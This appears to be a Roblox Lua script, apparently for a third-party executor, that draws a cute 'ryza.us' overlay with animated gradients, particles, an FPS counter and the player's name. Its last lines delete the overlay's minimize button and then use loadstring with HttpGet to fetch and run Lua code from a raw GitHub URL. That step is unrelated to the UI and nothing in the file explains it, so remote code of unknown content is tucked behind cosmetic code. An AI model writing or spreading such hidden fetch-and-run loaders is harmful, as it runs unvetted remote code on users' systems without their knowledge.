-- ✨ Enhanced Modern & Cute Ryza UI ✨
-- Completely revamped with animated pastel gradients, kawaii icons, and smooth transitions

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

if playerGui:FindFirstChild("ryza") then
	playerGui:FindFirstChild("ryza"):Destroy()
end

-- Create the ScreenGui
local ryza = Instance.new("ScreenGui")
ryza.Name = "ryza"
ryza.Parent = playerGui
ryza.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ryza.ResetOnSpawn = false
ryza.DisplayOrder = 9836487326844
ryza.IgnoreGuiInset = true

local uipadding = Instance.new("UIPadding")
uipadding.Parent = ryza
uipadding.PaddingTop = UDim.new(0, 10)
uipadding.PaddingRight = UDim.new(0, 10)

local list = Instance.new("UIListLayout")
list.Parent = ryza
list.HorizontalAlignment = Enum.HorizontalAlignment.Right
list.HorizontalFlex = Enum.UIFlexAlignment.None
list.ItemLineAlignment = Enum.ItemLineAlignment.Automatic
list.VerticalAlignment = Enum.VerticalAlignment.Top
list.VerticalFlex = Enum.UIFlexAlignment.None
list.Padding = UDim.new(0, 5)

-- Create the TopBar (main container) with larger, more modern size
local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Parent = ryza
TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
TopBar.BorderSizePixel = 0
TopBar.Position = UDim2.new(1, -220, 0, 10) -- Adjusted position for larger size
TopBar.Size = UDim2.new(0, 200, 0, 90) -- Taller and wider for more cuteness
TopBar.ClipsDescendants = true -- For particle effects
TopBar.AutomaticSize = Enum.AutomaticSize.Y

-- Glass morphism effect (frosted glass look)
local UIBlur = Instance.new("BlurEffect")
UIBlur.Parent = game:GetService("Lighting")
UIBlur.Size = 3
UIBlur.Enabled = true

-- Rounded corners with larger radius for modern look
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = TopBar

-- Enhanced glow effect with pastel color
local UIStroke = Instance.new("UIStroke")
UIStroke.Parent = TopBar
UIStroke.Color = Color3.fromRGB(220, 150, 255)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.3
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Add subtle pulsing animation to the border
spawn(function()
	while TopBar.Parent do
		for i = 0.3, 0.7, 0.01 do
			UIStroke.Transparency = i
			wait(0.03)
		end
		for i = 0.7, 0.3, -0.01 do
			UIStroke.Transparency = i
			wait(0.03)
		end
	end
end)

-- Main content container
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Parent = TopBar
ContentFrame.BackgroundTransparency = 1
ContentFrame.Size = UDim2.new(1, 0, 1, 0)

-- Padding for better spacing
local UIPadding = Instance.new("UIPadding")
UIPadding.Parent = ContentFrame
UIPadding.PaddingTop = UDim.new(0, 12)
UIPadding.PaddingBottom = UDim.new(0, 12)
UIPadding.PaddingLeft = UDim.new(0, 14)
UIPadding.PaddingRight = UDim.new(0, 14)

-- Create a dreamy animated background gradient (pastel kawaii style)
local BackgroundGradient = Instance.new("UIGradient")
BackgroundGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 45, 95)),
	ColorSequenceKeypoint.new(0.3, Color3.fromRGB(45, 45, 80)),
	ColorSequenceKeypoint.new(0.7, Color3.fromRGB(65, 40, 90)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 40, 75))
}
BackgroundGradient.Rotation = 45
BackgroundGradient.Parent = TopBar

-- Animate background gradient
spawn(function()
	local rotation = 45
	while TopBar.Parent do
		rotation = (rotation + 0.2) % 360
		BackgroundGradient.Rotation = rotation
		wait(0.03)
	end
end)

-- Add cute decorative icons
local function createCuteIcon(position, icon, size, color)
	local iconFrame = Instance.new("Frame")
	iconFrame.Name = "CuteIcon"
	iconFrame.Parent = TopBar
	iconFrame.BackgroundTransparency = 1
	iconFrame.Position = position
	iconFrame.Size = UDim2.new(0, size, 0, size)
	iconFrame.ZIndex = 3

	local iconLabel = Instance.new("TextLabel")
	iconLabel.Name = "Icon"
	iconLabel.Parent = iconFrame
	iconLabel.BackgroundTransparency = 1
	iconLabel.Size = UDim2.new(1, 0, 1, 0)
	iconLabel.Font = Enum.Font.GothamBold
	iconLabel.Text = icon
	iconLabel.TextColor3 = color
	iconLabel.TextSize = size - 2
	iconLabel.TextWrapped = true

	-- Add cute hover animation
	iconFrame.MouseEnter:Connect(function()
		TweenService:Create(iconLabel, TweenInfo.new(0.3), {Rotation = 15, TextSize = size + 2}):Play()
	end)

	iconFrame.MouseLeave:Connect(function()
		TweenService:Create(iconLabel, TweenInfo.new(0.3), {Rotation = 0, TextSize = size - 2}):Play()
	end)

	return iconFrame
end

-- Add decorative star icons
createCuteIcon(UDim2.new(0.1, 0, 0.75, 0), "⭐", 12, Color3.fromRGB(255, 220, 130))

-- Create purple RYZA logo badge (enhanced kawaii version)
local LogoContainer = Instance.new("Frame")
LogoContainer.Name = "LogoContainer"
LogoContainer.Parent = ContentFrame
LogoContainer.BackgroundColor3 = Color3.fromRGB(200, 100, 255)
LogoContainer.Position = UDim2.new(0, 0, 0, 0)
LogoContainer.Size = UDim2.new(0, 46, 0, 20)

-- Rounded corners for the logo container
local LogoContainerCorner = Instance.new("UICorner")
LogoContainerCorner.CornerRadius = UDim.new(0, 8)
LogoContainerCorner.Parent = LogoContainer

-- Cute logo text with icons
local LogoText = Instance.new("TextLabel")
LogoText.Name = "LogoText"
LogoText.Parent = LogoContainer
LogoText.BackgroundTransparency = 1
LogoText.Position = UDim2.new(0, 0, 0, 0)
LogoText.Size = UDim2.new(1, 0, 1, 0)
LogoText.Font = Enum.Font.GothamBlack
LogoText.Text = " RYZA "
LogoText.TextColor3 = Color3.fromRGB(255, 255, 255)
LogoText.TextSize = 10
LogoText.TextXAlignment = Enum.TextXAlignment.Center

-- Modern gradient for the logo
local LogoGradient = Instance.new("UIGradient")
LogoGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 130, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 80, 255))
}
LogoGradient.Rotation = 45
LogoGradient.Parent = LogoContainer

-- Add subtle shadow to logo
local LogoShadow = Instance.new("ImageLabel")
LogoShadow.Name = "LogoShadow"
LogoShadow.Parent = LogoContainer
LogoShadow.BackgroundTransparency = 1
LogoShadow.Position = UDim2.new(0, 2, 0, 2)
LogoShadow.Size = UDim2.new(1, 0, 1, 0)
LogoShadow.ZIndex = -1
LogoShadow.Image = "rbxassetid://1316045217" -- Soft shadow asset
LogoShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
LogoShadow.ImageTransparency = 0.7
LogoShadow.ScaleType = Enum.ScaleType.Slice
LogoShadow.SliceCenter = Rect.new(10, 10, 118, 118)

-- Create styled ryza.us text
local TitleText = Instance.new("TextLabel")
TitleText.Name = "TitleText"
TitleText.Parent = ContentFrame
TitleText.BackgroundTransparency = 1
TitleText.Position = UDim2.new(0, 54, 0, 2)
TitleText.Size = UDim2.new(0, 130, 0, 20)
TitleText.Font = Enum.Font.GothamBold
TitleText.Text = "ryza.us"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 18
TitleText.TextXAlignment = Enum.TextXAlignment.Left

-- Add cute rainbow effect to title
local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(0.2, Color3.fromRGB(230, 190, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 245)),
	ColorSequenceKeypoint.new(0.8, Color3.fromRGB(230, 190, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
}
TitleGradient.Parent = TitleText

-- Animate title gradient
spawn(function()
	local offset = 0
	while TopBar.Parent do
		offset = (offset + 0.01) % 1
		TitleGradient.Offset = Vector2.new(offset, 0)
		wait(0.03)
	end
end)

-- Create divider line (soft pastel style)
local Divider = Instance.new("Frame")
Divider.Name = "Divider"
Divider.Parent = ContentFrame
Divider.BackgroundColor3 = Color3.fromRGB(180, 130, 255)
Divider.Position = UDim2.new(0, 0, 0, 30)
Divider.Size = UDim2.new(1, 0, 0, 1)
Divider.BorderSizePixel = 0
Divider.Transparency = 0.7

-- Add stats container with a soft background
local StatsContainer = Instance.new("Frame")
StatsContainer.Name = "StatsContainer"
StatsContainer.Parent = ContentFrame
StatsContainer.BackgroundColor3 = Color3.fromRGB(60, 50, 80)
StatsContainer.BackgroundTransparency = 0.7
StatsContainer.Position = UDim2.new(0, 0, 0, 40)
StatsContainer.Size = UDim2.new(1, 0, 0, 38)
StatsContainer.BorderSizePixel = 0
StatsContainer.Transparency = 1

local paddingnew = Instance.new("UIPadding")
paddingnew.Parent = TopBar
paddingnew.PaddingBottom = UDim.new(0, 3)

-- Add rounded corners to stats container
local StatsCorner = Instance.new("UICorner")
StatsCorner.CornerRadius = UDim.new(0, 8)
StatsCorner.Parent = StatsContainer

-- Enhanced FPS Counter with cute icon
local FPSIcon = Instance.new("TextLabel")
FPSIcon.Name = "FPSIcon"
FPSIcon.Parent = StatsContainer
FPSIcon.BackgroundTransparency = 1
FPSIcon.Position = UDim2.new(0, 8, 0, 5)
FPSIcon.Size = UDim2.new(0, 16, 0, 16)
FPSIcon.Font = Enum.Font.GothamBold
FPSIcon.Text = "♡"
FPSIcon.TextColor3 = Color3.fromRGB(255, 180, 255)
FPSIcon.TextSize = 16

local FPSLabel = Instance.new("TextLabel")
FPSLabel.Name = "FPSLabel"
FPSLabel.Parent = StatsContainer
FPSLabel.BackgroundTransparency = 1
FPSLabel.Position = UDim2.new(0, 26, 0, 7)
FPSLabel.Size = UDim2.new(0, 60, 0, 12)
FPSLabel.Font = Enum.Font.GothamSemibold
FPSLabel.Text = "60 FPS"
FPSLabel.TextColor3 = Color3.fromRGB(230, 180, 255)
FPSLabel.TextSize = 14
FPSLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Username with cute icon
local UserIcon = Instance.new("TextLabel")
UserIcon.Name = "UserIcon"
UserIcon.Parent = StatsContainer
UserIcon.BackgroundTransparency = 1
UserIcon.Position = UDim2.new(0, 8, 0, 22)
UserIcon.Size = UDim2.new(0, 16, 0, 16)
UserIcon.Font = Enum.Font.GothamBold
UserIcon.Text = "★"
UserIcon.TextColor3 = Color3.fromRGB(255, 220, 130)
UserIcon.TextSize = 14

local UsernameLabel = Instance.new("TextLabel")
UsernameLabel.Name = "UsernameLabel"
UsernameLabel.Parent = StatsContainer
UsernameLabel.BackgroundTransparency = 1
UsernameLabel.Position = UDim2.new(0, 26, 0, 22)
UsernameLabel.Size = UDim2.new(0, 150, 0, 12)
UsernameLabel.Font = Enum.Font.GothamSemibold
UsernameLabel.Text = player.Name
UsernameLabel.TextColor3 = Color3.fromRGB(220, 200, 255)
UsernameLabel.TextSize = 14
UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Create and enhance the particle background effect (magical kawaii particles)
local ParticleContainer = Instance.new("Frame")
ParticleContainer.Name = "ParticleContainer"
ParticleContainer.Parent = TopBar
ParticleContainer.BackgroundTransparency = 1
ParticleContainer.Size = UDim2.new(1, 0, 1, 0)
ParticleContainer.ZIndex = 2
ParticleContainer.ClipsDescendants = true

-- Create various kawaii particle types
local particleTypes = {
	{shape = "●", colors = {Color3.fromRGB(255, 200, 255), Color3.fromRGB(200, 150, 255), Color3.fromRGB(255, 220, 200)}},
	{shape = "✧", colors = {Color3.fromRGB(255, 255, 200), Color3.fromRGB(200, 255, 255), Color3.fromRGB(255, 200, 220)}},
	{shape = "♡", colors = {Color3.fromRGB(255, 150, 200), Color3.fromRGB(180, 150, 255), Color3.fromRGB(150, 220, 255)}}
}

-- Create floating cute particles
for i = 1, 15 do
	local particleType = particleTypes[math.random(1, #particleTypes)]
	local particleColor = particleType.colors[math.random(1, #particleType.colors)]

	local particle = Instance.new("TextLabel")
	particle.Name = "KawaiiParticle_" .. i
	particle.Parent = ParticleContainer
	particle.BackgroundTransparency = 1
	particle.Size = UDim2.new(0, math.random(10, 16), 0, math.random(10, 16))
	particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
	particle.Text = particleType.shape
	particle.TextColor3 = particleColor
	particle.TextTransparency = math.random(60, 90)/100
	particle.Font = Enum.Font.GothamBold
	particle.TextSize = math.random(8, 12)
	particle.ZIndex = 1
	particle.Rotation = math.random(0, 360)

	-- Animate particle with more complex movement
	spawn(function()
		while ParticleContainer.Parent do
			local randomX = math.random() * 0.8 + 0.1
			local randomY = math.random() * 0.8 + 0.1
			local randomDuration = math.random(4, 8)
			local randomRotation = math.random(-30, 30)
			local randomSize = math.random(8, 12)

			local tweenInfo = TweenInfo.new(randomDuration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
			local tween = TweenService:Create(particle, tweenInfo, {
				Position = UDim2.new(randomX, 0, randomY, 0),
				TextTransparency = math.random(60, 90)/100,
				Rotation = particle.Rotation + randomRotation,
				TextSize = randomSize
			})
			tween:Play()
			wait(randomDuration - 0.1)
		end
	end)
end

-- Add minimize/expand button
local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = TopBar
ToggleButton.BackgroundColor3 = Color3.fromRGB(160, 100, 255)
ToggleButton.BackgroundTransparency = 0.3
ToggleButton.Position = UDim2.new(1, -30, 0, 9)
ToggleButton.Size = UDim2.new(0, 20, 0, 20)
ToggleButton.Text = "↑"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.AutoButtonColor = false

-- Button corner
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(1, 0)
ButtonCorner.Parent = ToggleButton

-- Button hover effect
ToggleButton.MouseEnter:Connect(function()
	TweenService:Create(ToggleButton, TweenInfo.new(0.3), {
		BackgroundTransparency = 0,
		TextSize = 16
	}):Play()
end)

ToggleButton.MouseLeave:Connect(function()
	TweenService:Create(ToggleButton, TweenInfo.new(0.3), {
		BackgroundTransparency = 0.3,
		TextSize = 14
	}):Play()
end)

-- Button toggle functionality
local isMinimized = false
ToggleButton.MouseButton1Click:Connect(function()
	isMinimized = not isMinimized

	if isMinimized then
		ToggleButton.Text = "↓"
		TweenService:Create(TopBar, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 200, 0, 40)
		}):Play()

		-- Hide content when minimized
		TweenService:Create(StatsContainer, TweenInfo.new(0.3), {
			BackgroundTransparency = 1
		}):Play()
		TweenService:Create(Divider, TweenInfo.new(0.3), {
			Transparency = 1
		}):Play()

		-- Make particles more transparent when minimized
		for _, particle in pairs(ParticleContainer:GetChildren()) do
			TweenService:Create(particle, TweenInfo.new(0.5), {
				TextTransparency = 0.95
			}):Play()
		end
	else
		ToggleButton.Text = "↑"
		TweenService:Create(TopBar, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 200, 0, 90)
		}):Play()

		-- Show content when expanded
		TweenService:Create(StatsContainer, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		TweenService:Create(Divider, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			Transparency = 0.7
		}):Play()

		-- Restore particle visibility
		for _, particle in pairs(ParticleContainer:GetChildren()) do
			TweenService:Create(particle, TweenInfo.new(0.5), {
				TextTransparency = math.random(60, 90)/100
			}):Play()
		end
	end
end)

-- Make the TopBar draggable
local isDragging = false
local dragInput
local dragStart
local startPos

local function updateDrag(input)
	local delta = input.Position - dragStart
	TopBar.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TopBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = true
		dragStart = input.Position
		startPos = TopBar.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				isDragging = false
			end
		end)
	end
end)

TopBar.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and isDragging then
		updateDrag(input)
	end
end)

-- FPS Counter update with smoother transition
local fps = 60
local timeElapsed = 0
local frames = 0

RunService.RenderStepped:Connect(function(deltaTime)
	frames = frames + 1
	timeElapsed = timeElapsed + deltaTime

	if timeElapsed >= 0.5 then  -- Update twice per second for smoother display
		local newFps = math.floor(frames / timeElapsed)

		-- Smoothly tween FPS value
		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

		-- Change color based on FPS (red for low, green for high)
		local fpsColor
		if newFps < 30 then
			fpsColor = Color3.fromRGB(255, 150, 150)  -- Low FPS (reddish)
		elseif newFps < 60 then
			fpsColor = Color3.fromRGB(255, 220, 130)  -- Medium FPS (yellowish)
		else
			fpsColor = Color3.fromRGB(180, 255, 180)  -- High FPS (greenish)
		end

		TweenService:Create(FPSLabel, tweenInfo, {
			TextColor3 = fpsColor
		}):Play()

		FPSLabel.Text = newFps .. " FPS"
		fps = newFps

		timeElapsed = 0
		frames = 0
	end
end)

-- Add a subtle pulsing animation to the FPS heart icon
spawn(function()
	while FPSIcon.Parent do
		for i = 14, 18, 0.2 do
			FPSIcon.TextSize = i
			wait(0.03)
		end
		for i = 18, 14, -0.2 do
			FPSIcon.TextSize = i
			wait(0.03)
		end
	end
end)

ToggleButton:Destroy()
task.wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/playerlist.lua"))()

return ryza
